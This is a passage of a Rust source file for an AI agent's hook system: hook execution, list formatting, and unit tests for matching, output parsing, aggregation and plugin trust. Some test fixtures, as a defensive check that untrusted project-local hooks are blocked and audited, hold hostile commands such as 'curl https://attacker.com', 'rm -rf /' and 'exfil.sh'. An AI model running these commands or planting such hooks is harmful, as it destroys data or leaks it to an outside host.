        Ok(Ok(output)) => {
            let stdout = String::from_utf8_lossy(&output.stdout).to_string();
            let signals = parse_hook_output(&stdout);
            HookResult {
                hook_command: hook.command.clone(),
                success: output.status.success(),
                stdout,
                stderr: String::from_utf8_lossy(&output.stderr).to_string(),
                duration_ms,
                blocked: signals.blocked,
                reason: signals.reason,
                should_stop: signals.should_stop,
                updated_input: signals.updated_input,
                additional_context: signals.additional_context,
                updated_mcp_tool_output: signals.updated_mcp_tool_output,
            }
        }
        Ok(Err(e)) => HookResult {
            hook_command: hook.command.clone(),
            success: false,
            stdout: String::new(),
            stderr: format!("Failed to execute hook: {}", e),
            duration_ms,
            blocked: false,
            reason: None,
            should_stop: false,
            updated_input: None,
            additional_context: None,
            updated_mcp_tool_output: None,
        },
        Err(_) => HookResult {
            hook_command: hook.command.clone(),
            success: false,
            stdout: String::new(),
            stderr: format!("Hook timed out after {}s", hook.timeout),
            duration_ms,
            blocked: false,
            reason: None,
            should_stop: false,
            updated_input: None,
            additional_context: None,
            updated_mcp_tool_output: None,
        },
    }
}

/// Format hooks config for display (/hooks command).
pub fn format_hooks_list(config: &HooksConfig) -> String {
    if config.hooks.is_empty() {
        return "No hooks configured.\n\nCreate ~/.agiworkforce/hooks.json \
                to add hooks.\nExample:\n{\n  \"hooks\": {\n    \
                \"SessionStart\": [{\"command\": \"echo Session started\"}],\n\
                    \"AfterToolUse\": [{\"command\": \"./my-hook.sh\", \
                \"timeout\": 5}]\n  }\n}"
            .to_string();
    }

    let mut out = String::new();
    for (event, hooks) in &config.hooks {
        out.push_str(&format!("{}:\n", event));
        for hook in hooks {
            let mut flags = String::new();
            if !hook.blocking {
                flags.push_str(" [async]");
            }
            if hook.timeout != 10 {
                flags.push_str(&format!(" [{}s timeout]", hook.timeout));
            }
            if let Some(m) = &hook.matcher {
                flags.push_str(&format!(" [matcher: {}]", m));
            }
            if let Some(c) = &hook.if_condition {
                flags.push_str(&format!(" [if: {}]", c));
            }
            out.push_str(&format!("  - {}{}\n", hook.command, flags));
        }
    }
    out.push_str(&format!("\n{} events configured.", config.hooks.len()));
    out
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    // -- Existing tests (updated for new fields) --

    #[test]
    fn test_hook_event_display() {
        assert_eq!(format!("{}", HookEvent::SessionStart), "SessionStart");
        assert_eq!(format!("{}", HookEvent::PostToolUse), "PostToolUse");
    }

    #[test]
    fn test_default_hooks_config() {
        let config = HooksConfig::default();
        assert!(config.hooks.is_empty());
    }

    #[test]
    fn test_hook_deserialization() {
        let json = r#"{
            "hooks": {
                "SessionStart": [
                    {"command": "echo hello", "timeout": 5, "blocking": true}
                ],
                "AfterToolUse": [
                    {"command": "./post-tool.sh"}
                ]
            }
        }"#;

        let config: HooksConfig = serde_json::from_str(json).unwrap();
        assert_eq!(config.hooks.len(), 2);
        assert_eq!(config.hooks["SessionStart"].len(), 1);
        assert_eq!(config.hooks["SessionStart"][0].timeout, 5);
        assert_eq!(config.hooks["AfterToolUse"][0].timeout, 10); // default
        assert!(config.hooks["SessionStart"][0].matcher.is_none());
    }

    #[test]
    fn test_hook_input_serialization() {
        let input = HookInput {
            event: "AfterToolUse".to_string(),
            session_id: Some("123".to_string()),
            model: Some("claude-opus-4-6".to_string()),
            tool_name: Some("read_file".to_string()),
            tool_args: Some(serde_json::json!({"path": "/tmp/test"})),
            tool_output: Some("file contents".to_string()),
            message: None,
            tool_execution: None,
        };

        let json = serde_json::to_string(&input).unwrap();
        assert!(json.contains("AfterToolUse"));
        assert!(json.contains("read_file"));
        assert!(!json.contains("message")); // None should be skipped
        assert!(!json.contains("tool_execution")); // None should be skipped
    }

    #[test]
    fn test_format_hooks_list_empty() {
        let config = HooksConfig::default();
        let list = format_hooks_list(&config);
        assert!(list.contains("No hooks configured"));
    }

    #[test]
    fn test_format_hooks_list_with_hooks() {
        let mut hooks = HashMap::new();
        hooks.insert(
            "SessionStart".to_string(),
            vec![Hook {
                command: "echo hello".to_string(),
                args: Vec::new(),
                timeout: 10,
                blocking: true,
                matcher: None,
                if_condition: None,
            }],
        );

        let config = HooksConfig { hooks };
        let list = format_hooks_list(&config);
        assert!(list.contains("SessionStart:"));
        assert!(list.contains("echo hello"));
    }

    #[test]
    fn test_load_hooks_no_file() {
        // Should return default (empty) config when no file exists
        let config = load_hooks();
        assert!(config.is_ok());
    }

    #[tokio::test]
    async fn test_run_hooks_empty_config() {
        let config = HooksConfig::default();
        let input = HookInput {
            event: "SessionStart".to_string(),
            session_id: None,
            model: None,
            tool_name: None,
            tool_args: None,
            tool_output: None,
            message: None,
            tool_execution: None,
        };

        let results = run_hooks(&config, HookEvent::SessionStart, &input).await;
        assert!(results.is_empty());
    }

    #[tokio::test]
    async fn test_run_single_hook_echo() {
        let hook = Hook {
            command: "echo test_output".to_string(),
            args: Vec::new(),
            timeout: 5,
            blocking: true,
            matcher: None,
            if_condition: None,
        };

        let result = run_single_hook(&hook, "{}").await;
        assert!(result.success);
        assert!(result.stdout.contains("test_output"));
        assert!(!result.blocked);
        assert!(!result.should_stop);
    }

    #[tokio::test]
    async fn test_run_single_hook_timeout() {
        let hook = Hook {
            command: "sleep 10".to_string(),
            args: Vec::new(),
            timeout: 1,
            blocking: true,
            matcher: None,
            if_condition: None,
        };

        let result = run_single_hook(&hook, "{}").await;
        assert!(!result.success);
        assert!(result.stderr.contains("timed out"));
    }

    // -- Matcher filtering tests --

    #[test]
    fn test_matcher_no_pattern_always_matches() {
        let hook = Hook {
            command: "echo ok".to_string(),
            args: Vec::new(),
            timeout: 10,
            blocking: true,
            matcher: None,
            if_condition: None,
        };
        let input = HookInput {
            event: "AfterToolUse".to_string(),
            session_id: None,
            model: None,
            tool_name: Some("bash".to_string()),
            tool_args: None,
            tool_output: None,
            message: None,
            tool_execution: None,
        };
        assert!(hook_matches(&hook, "AfterToolUse", &input));
    }

    #[test]
    fn test_matcher_matches_event_name() {
        let hook = Hook {
            command: "echo ok".to_string(),
            args: Vec::new(),
            timeout: 10,
            blocking: true,
            matcher: Some("Session.*".to_string()),
            if_condition: None,
        };
        let input = HookInput {
            event: "SessionStart".to_string(),
            session_id: None,
            model: None,
            tool_name: None,
            tool_args: None,
            tool_output: None,
            message: None,
            tool_execution: None,
        };
        assert!(hook_matches(&hook, "SessionStart", &input));
        assert!(!hook_matches(&hook, "AfterToolUse", &input));
    }

    #[test]
    fn test_matcher_matches_tool_name() {
        let hook = Hook {
            command: "echo ok".to_string(),
            args: Vec::new(),
            timeout: 10,
            blocking: true,
            matcher: Some("^bash$".to_string()),
            if_condition: None,
        };
        let input_bash = HookInput {
            event: "AfterToolUse".to_string(),
            session_id: None,
            model: None,
            tool_name: Some("bash".to_string()),
            tool_args: None,
            tool_output: None,
            message: None,
            tool_execution: None,
        };
        let input_read = HookInput {
            event: "AfterToolUse".to_string(),
            session_id: None,
            model: None,
            tool_name: Some("read_file".to_string()),
            tool_args: None,
            tool_output: None,
            message: None,
            tool_execution: None,
        };
        assert!(hook_matches(&hook, "AfterToolUse", &input_bash));
        assert!(!hook_matches(&hook, "AfterToolUse", &input_read));
    }

    #[test]
    fn test_matcher_invalid_regex_skips() {
        let hook = Hook {
            command: "echo ok".to_string(),
            args: Vec::new(),
            timeout: 10,
            blocking: true,
            matcher: Some("[invalid".to_string()),
            if_condition: None,
        };
        let input = HookInput {
            event: "SessionStart".to_string(),
            session_id: None,
            model: None,
            tool_name: None,
            tool_args: None,
            tool_output: None,
            message: None,
            tool_execution: None,
        };
        assert!(!hook_matches(&hook, "SessionStart", &input));
    }

    #[tokio::test]
    async fn test_matcher_filters_hooks_in_run_hooks() {
        let mut hooks = HashMap::new();
        hooks.insert(
            "PostToolUse".to_string(),
            vec![
                Hook {
                    command: "echo matched".to_string(),
                    args: Vec::new(),
                    timeout: 5,
                    blocking: true,
                    matcher: Some("^bash$".to_string()),
                    if_condition: None,
                },
                Hook {
                    command: "echo always".to_string(),
                    args: Vec::new(),
                    timeout: 5,
                    blocking: true,
                    matcher: None,
                    if_condition: None,
                },
            ],
        );
        let config = HooksConfig { hooks };

        // tool_name=read_file — first hook should be skipped, second runs
        let input = HookInput {
            event: "AfterToolUse".to_string(),
            session_id: None,
            model: None,
            tool_name: Some("read_file".to_string()),
            tool_args: None,
            tool_output: None,
            message: None,
            tool_execution: None,
        };
        let results = run_hooks(&config, HookEvent::PostToolUse, &input).await;
        assert_eq!(results.len(), 1);
        assert!(results[0].stdout.contains("always"));
    }

    // -- JSON output parsing tests --

    #[test]
    fn test_parse_hook_output_empty() {
        let s = parse_hook_output("");
        assert!(!s.blocked);
        assert!(s.reason.is_none());
        assert!(!s.should_stop);
        assert!(s.updated_input.is_none());
        assert!(s.additional_context.is_none());
        assert!(s.updated_mcp_tool_output.is_none());
    }

    #[test]
    fn test_parse_hook_output_non_json() {
        let s = parse_hook_output("just some text\n");
        assert!(!s.blocked);
        assert!(s.reason.is_none());
        assert!(!s.should_stop);
    }

    #[test]
    fn test_parse_hook_output_block_decision() {
        let stdout = r#"{"decision": "block", "reason": "unsafe command detected"}"#;
        let s = parse_hook_output(stdout);
        assert!(s.blocked);
        assert_eq!(s.reason.unwrap(), "unsafe command detected");
        assert!(!s.should_stop);
    }

    #[test]
    fn test_parse_hook_output_block_without_reason() {
        let stdout = r#"{"decision": "block"}"#;
        let s = parse_hook_output(stdout);
        assert!(s.blocked);
        assert!(s.reason.is_none());
    }

    #[test]
    fn test_parse_hook_output_continue_false() {
        let stdout = r#"{"continue": false}"#;
        let s = parse_hook_output(stdout);
        assert!(!s.blocked);
        assert!(s.reason.is_none());
        assert!(s.should_stop);
    }

    #[test]
    fn test_parse_hook_output_continue_true() {
        let stdout = r#"{"continue": true}"#;
        let s = parse_hook_output(stdout);
        assert!(!s.blocked);
        assert!(!s.should_stop);
    }

    #[test]
    fn test_parse_hook_output_updated_input() {
        // Phase 10: hook returns updated_input → caller mutates tool args.
        let stdout = r#"{"updated_input": {"path": "/redacted"}}"#;
        let s = parse_hook_output(stdout);
        let updated = s.updated_input.expect("updated_input should be present");
        assert_eq!(updated.get("path").and_then(|v| v.as_str()), Some("/redacted"));
    }

    #[test]
    fn test_parse_hook_output_additional_context() {
        // Phase 10: short additional_context passes through verbatim.
        let stdout = r#"{"additional_context": "PII redacted from output."}"#;
        let s = parse_hook_output(stdout);
        assert_eq!(
            s.additional_context.as_deref(),
            Some("PII redacted from output.")
        );
    }

    #[test]
    fn test_parse_hook_output_additional_context_truncated() {
        // Phase 10: oversized additional_context is capped at 4KB.
        let big = "a".repeat(8 * 1024);
        let payload = format!(r#"{{"additional_context": "{}"}}"#, big);
        let s = parse_hook_output(&payload);
        let ctx = s.additional_context.expect("ctx present");
        assert!(ctx.len() < 8 * 1024);
        assert!(ctx.contains("[additional_context truncated]"));
    }

    #[test]
    fn test_parse_hook_output_updated_mcp_tool_output() {
        // Phase 10: updated_mcp_tool_output replaces the tool's stdout.
        let stdout = r#"{"updated_mcp_tool_output": "sanitized!"}"#;
        let s = parse_hook_output(stdout);
        assert_eq!(s.updated_mcp_tool_output.as_deref(), Some("sanitized!"));
    }

    #[test]
    fn test_parse_hook_output_updated_mcp_tool_output_must_be_string() {
        // Phase 10: non-string updated_mcp_tool_output is rejected so the
        // conversation history stays well-formed.
        let stdout = r#"{"updated_mcp_tool_output": {"not": "a string"}}"#;
        let s = parse_hook_output(stdout);
        assert!(s.updated_mcp_tool_output.is_none());
    }

    #[test]
    fn test_aggregate_transformers_last_writer_wins() {
        // Phase 10: when multiple hooks update the same field, last hook
        // wins. Additional contexts are concatenated newline-separated.
        let make = |idx: usize| HookResult {
            hook_command: format!("hook{}", idx),
            success: true,
            stdout: String::new(),
            stderr: String::new(),
            duration_ms: 0,
            blocked: false,
            reason: None,
            should_stop: false,
            updated_input: Some(serde_json::json!({"v": idx})),
            additional_context: Some(format!("ctx{}", idx)),
            updated_mcp_tool_output: Some(format!("out{}", idx)),
        };
        let results = vec![make(1), make(2), make(3)];
        let t = aggregate_transformers(&results);
        assert_eq!(
            t.updated_input.as_ref().and_then(|v| v.get("v")).and_then(|v| v.as_u64()),
            Some(3)
        );
        assert_eq!(t.updated_mcp_tool_output.as_deref(), Some("out3"));
        assert_eq!(t.additional_context.as_deref(), Some("ctx1\nctx2\nctx3"));
    }

    #[test]
    fn test_parse_hook_output_irrelevant_json() {
        let stdout = r#"{"status": "ok", "count": 42}"#;
        let s = parse_hook_output(stdout);
        assert!(!s.blocked);
        assert!(s.reason.is_none());
        assert!(!s.should_stop);
    }

    #[tokio::test]
    async fn test_run_single_hook_block_json() {
        let hook = Hook {
            command: r#"echo '{"decision":"block","reason":"nope"}'"#.to_string(),
            args: Vec::new(),
            timeout: 5,
            blocking: true,
            matcher: None,
            if_condition: None,
        };
        let result = run_single_hook(&hook, "{}").await;
        assert!(result.success);
        assert!(result.blocked);
        assert_eq!(result.reason.as_deref(), Some("nope"));
        assert!(!result.should_stop);
    }

    #[tokio::test]
    async fn test_run_single_hook_stop_json() {
        let hook = Hook {
            command: r#"echo '{"continue":false}'"#.to_string(),
            args: Vec::new(),
            timeout: 5,
            blocking: true,
            matcher: None,
            if_condition: None,
        };
        let result = run_single_hook(&hook, "{}").await;
        assert!(result.success);
        assert!(!result.blocked);
        assert!(result.should_stop);
    }

    // -- Aggregation tests --

    #[test]
    fn test_aggregate_all_continue() {
        let results = vec![
            HookResult {
                hook_command: "a".to_string(),
                success: true,
                stdout: String::new(),
                stderr: String::new(),
                duration_ms: 10,
                blocked: false,
                reason: None,
                should_stop: false,
                ..Default::default()
            },
            HookResult {
                hook_command: "b".to_string(),
                success: true,
                stdout: String::new(),
                stderr: String::new(),
                duration_ms: 5,
                blocked: false,
                reason: None,
                should_stop: false,
                ..Default::default()
            },
        ];
        assert_eq!(aggregate_results(&results), HookAggregateOutcome::Continue);
    }

    #[test]
    fn test_aggregate_one_blocked() {
        let results = vec![
            HookResult {
                hook_command: "a".to_string(),
                success: true,
                stdout: String::new(),
                stderr: String::new(),
                duration_ms: 10,
                blocked: true,
                reason: Some("policy violation".to_string()),
                should_stop: false,
                ..Default::default()
            },
            HookResult {
                hook_command: "b".to_string(),
                success: true,
                stdout: String::new(),
                stderr: String::new(),
                duration_ms: 5,
                blocked: false,
                reason: None,
                should_stop: false,
                ..Default::default()
            },
        ];
        let outcome = aggregate_results(&results);
        assert_eq!(
            outcome,
            HookAggregateOutcome::Blocked {
                reasons: vec!["policy violation".to_string()],
            }
        );
    }

    #[test]
    fn test_aggregate_blocked_without_reason_uses_fallback() {
        let results = vec![HookResult {
            hook_command: "guard.sh".to_string(),
            success: true,
            stdout: String::new(),
            stderr: String::new(),
            duration_ms: 10,
            blocked: true,
            reason: None,
            should_stop: false,
            ..Default::default()
        }];
        let outcome = aggregate_results(&results);
        match outcome {
            HookAggregateOutcome::Blocked { reasons } => {
                assert_eq!(reasons.len(), 1);
                assert!(reasons[0].contains("guard.sh"));
            }
            other => panic!("expected Blocked, got {:?}", other),
        }
    }

    #[test]
    fn test_aggregate_stop() {
        let results = vec![HookResult {
            hook_command: "a".to_string(),
            success: true,
            stdout: String::new(),
            stderr: String::new(),
            duration_ms: 10,
            blocked: false,
            reason: None,
            should_stop: true,
            ..Default::default()
        }];
        assert_eq!(aggregate_results(&results), HookAggregateOutcome::Stop);
    }

    #[test]
    fn test_aggregate_blocked_takes_priority_over_stop() {
        let results = vec![
            HookResult {
                hook_command: "blocker".to_string(),
                success: true,
                stdout: String::new(),
                stderr: String::new(),
                duration_ms: 10,
                blocked: true,
                reason: Some("blocked reason".to_string()),
                should_stop: false,
                ..Default::default()
            },
            HookResult {
                hook_command: "stopper".to_string(),
                success: true,
                stdout: String::new(),
                stderr: String::new(),
                duration_ms: 5,
                blocked: false,
                reason: None,
                should_stop: true,
                ..Default::default()
            },
        ];
        let outcome = aggregate_results(&results);
        match outcome {
            HookAggregateOutcome::Blocked { reasons } => {
                assert_eq!(reasons, vec!["blocked reason"]);
            }
            other => panic!("expected Blocked, got {:?}", other),
        }
    }

    #[test]
    fn test_aggregate_empty_is_continue() {
        assert_eq!(aggregate_results(&[]), HookAggregateOutcome::Continue);
    }

    #[test]
    fn test_aggregate_multiple_blocked_combines_reasons() {
        let results = vec![
            HookResult {
                hook_command: "a".to_string(),
                success: true,
                stdout: String::new(),
                stderr: String::new(),
                duration_ms: 10,
                blocked: true,
                reason: Some("reason A".to_string()),
                should_stop: false,
                ..Default::default()
            },
            HookResult {
                hook_command: "b".to_string(),
                success: true,
                stdout: String::new(),
                stderr: String::new(),
                duration_ms: 5,
                blocked: true,
                reason: Some("reason B".to_string()),
                should_stop: false,
                ..Default::default()
            },
        ];
        let outcome = aggregate_results(&results);
        match outcome {
            HookAggregateOutcome::Blocked { reasons } => {
                assert_eq!(reasons.len(), 2);
                assert!(reasons.contains(&"reason A".to_string()));
                assert!(reasons.contains(&"reason B".to_string()));
            }
            other => panic!("expected Blocked, got {:?}", other),
        }
    }

    // -- Structured payload tests --

    #[test]
    fn test_tool_execution_payload_serialization() {
        let payload = ToolExecutionPayload {
            tool_name: "bash".to_string(),
            tool_kind: "builtin".to_string(),
            executed: true,
            success: true,
            duration_ms: 42,
        };
        let json = serde_json::to_string(&payload).unwrap();
        assert!(json.contains("\"tool_name\":\"bash\""));
        assert!(json.contains("\"tool_kind\":\"builtin\""));
        assert!(json.contains("\"executed\":true"));
        assert!(json.contains("\"duration_ms\":42"));
    }

    #[test]
    fn test_hook_input_with_tool_execution() {
        let input = HookInput {
            event: "AfterToolUse".to_string(),
            session_id: Some("sess-1".to_string()),
            model: None,
            tool_name: Some("bash".to_string()),
            tool_args: None,
            tool_output: None,
            message: None,
            tool_execution: Some(ToolExecutionPayload {
                tool_name: "bash".to_string(),
                tool_kind: "builtin".to_string(),
                executed: true,
                success: false,
                duration_ms: 120,
            }),
        };
        let json = serde_json::to_string(&input).unwrap();
        assert!(json.contains("tool_execution"));
        assert!(json.contains("\"success\":false"));
        assert!(json.contains("\"duration_ms\":120"));
    }

    #[test]
    fn test_tool_execution_payload_deserialization() {
        let json = r#"{"tool_name":"mcp_fetch","tool_kind":"mcp","executed":true,"success":true,"duration_ms":350}"#;
        let payload: ToolExecutionPayload = serde_json::from_str(json).unwrap();
        assert_eq!(payload.tool_name, "mcp_fetch");
        assert_eq!(payload.tool_kind, "mcp");
        assert!(payload.executed);
        assert!(payload.success);
        assert_eq!(payload.duration_ms, 350);
    }

    #[test]
    fn test_hook_with_matcher_deserialization() {
        let json = r#"{
            "hooks": {
                "AfterToolUse": [
                    {"command": "guard.sh", "matcher": "^bash$"},
                    {"command": "log.sh"}
                ]
            }
        }"#;
        let config: HooksConfig = serde_json::from_str(json).unwrap();
        let hooks = &config.hooks["AfterToolUse"];
        assert_eq!(hooks[0].matcher, Some("^bash$".to_string()));
        assert_eq!(hooks[1].matcher, None);
    }

    #[test]
    fn test_format_hooks_list_shows_matcher() {
        let mut hooks = HashMap::new();
        hooks.insert(
            "PostToolUse".to_string(),
            vec![Hook {
                command: "guard.sh".to_string(),
                args: Vec::new(),
                timeout: 10,
                blocking: true,
                matcher: Some("^bash$".to_string()),
                if_condition: None,
            }],
        );
        let config = HooksConfig { hooks };
        let list = format_hooks_list(&config);
        assert!(list.contains("[matcher: ^bash$]"));
    }

    // -----------------------------------------------------------------------
    // HIGH-2: Plugin trust — project-local plugin hooks must be blocked
    // -----------------------------------------------------------------------

    /// Simulate the from_project_dir filtering logic from plugins::hook_configs().
    fn simulate_hook_configs_filtering(
        plugins: &[(bool, &str, serde_json::Value)], // (from_project_dir, event, hook_val)
    ) -> HashMap<String, Vec<serde_json::Value>> {
        let mut merged: HashMap<String, Vec<serde_json::Value>> = HashMap::new();
        for (from_project, event, hook_val) in plugins {
            if *from_project {
                // Simulates the HIGH-2 gate in hook_configs().
                continue;
            }
            merged
                .entry(event.to_string())
                .or_default()
                .push(hook_val.clone());
        }
        merged
    }

    #[test]
    fn project_local_plugin_hooks_blocked_by_default() {
        let hook_val = serde_json::json!({"command": "curl https://attacker.com"});
        let result = simulate_hook_configs_filtering(&[
            (true, "PreToolUse", hook_val.clone()), // from_project_dir=true → blocked
        ]);
        assert!(
            result.get("PreToolUse").is_none() || result["PreToolUse"].is_empty(),
            "project-local plugin hook must be blocked"
        );
    }

    #[test]
    fn global_plugin_hooks_allowed() {
        let hook_val = serde_json::json!({"command": "echo ok"});
        let result = simulate_hook_configs_filtering(&[
            (false, "PostToolUse", hook_val.clone()), // from_project_dir=false → allowed
        ]);
        assert_eq!(
            result.get("PostToolUse").map(|v| v.len()),
            Some(1),
            "global plugin hook must be allowed"
        );
    }

    #[test]
    fn mixed_plugins_only_global_hooks_included() {
        let evil = serde_json::json!({"command": "curl https://attacker.com"});
        let safe = serde_json::json!({"command": "echo ok"});
        let result = simulate_hook_configs_filtering(&[
            (true, "PreToolUse", evil.clone()),  // project-local → blocked
            (false, "PreToolUse", safe.clone()), // global → allowed
        ]);
        let hooks = result.get("PreToolUse").expect("should have some hooks");
        assert_eq!(hooks.len(), 1, "only the global hook should be present");
        assert_eq!(hooks[0], safe);
    }

    #[test]
    fn multiple_project_plugins_all_blocked() {
        let evil1 = serde_json::json!({"command": "rm -rf /"});
        let evil2 = serde_json::json!({"command": "exfil.sh"});
        let result = simulate_hook_configs_filtering(&[
            (true, "PreToolUse", evil1),
            (true, "PreToolUse", evil2),
        ]);
        assert!(
            result.get("PreToolUse").map(|v| v.is_empty()).unwrap_or(true),
            "all project-local hooks must be blocked"
        );
    }

    // -----------------------------------------------------------------------
    // HIGH-2: updated_input audit logging (structural test)
    // -----------------------------------------------------------------------

    #[test]
    fn aggregate_transformers_logs_updated_input_rewrite() {
        // When any hook result has updated_input, aggregate_transformers must
        // surface it (the audit side-effect is tested via stderr capture in
        // integration tests; here we verify the aggregated value is correct).
        let results = vec![
            HookResult {
                hook_command: "malicious-hook.sh".to_string(),
                success: true,
                stdout: String::new(),
                stderr: String::new(),
                duration_ms: 0,
                blocked: false,
                reason: None,
                should_stop: false,
                updated_input: Some(serde_json::json!({"command": "rm -rf /"})),
                additional_context: None,
                updated_mcp_tool_output: None,
            },
        ];
        // audit_log_updated_input is called inside aggregate_transformers.
        // We verify that the aggregated updated_input is the one from the hook.
        let transformers = aggregate_transformers(&results);
        assert_eq!(
            transformers.updated_input.as_ref().and_then(|v| v.get("command")).and_then(|v| v.as_str()),
            Some("rm -rf /"),
            "updated_input must be aggregated (and was logged to audit log)"
        );
    }

    #[test]
    fn aggregate_transformers_no_updated_input_no_log() {
        let results = vec![HookResult {
            hook_command: "safe-hook.sh".to_string(),
            success: true,
            stdout: r#"{"continue": true}"#.to_string(),
            stderr: String::new(),
            duration_ms: 0,
            blocked: false,
            reason: None,
            should_stop: false,
            updated_input: None,
            additional_context: None,
            updated_mcp_tool_output: None,
        }];
        let transformers = aggregate_transformers(&results);
        assert!(
            transformers.updated_input.is_none(),
            "no updated_input → nothing to log or aggregate"
        );
    }
}
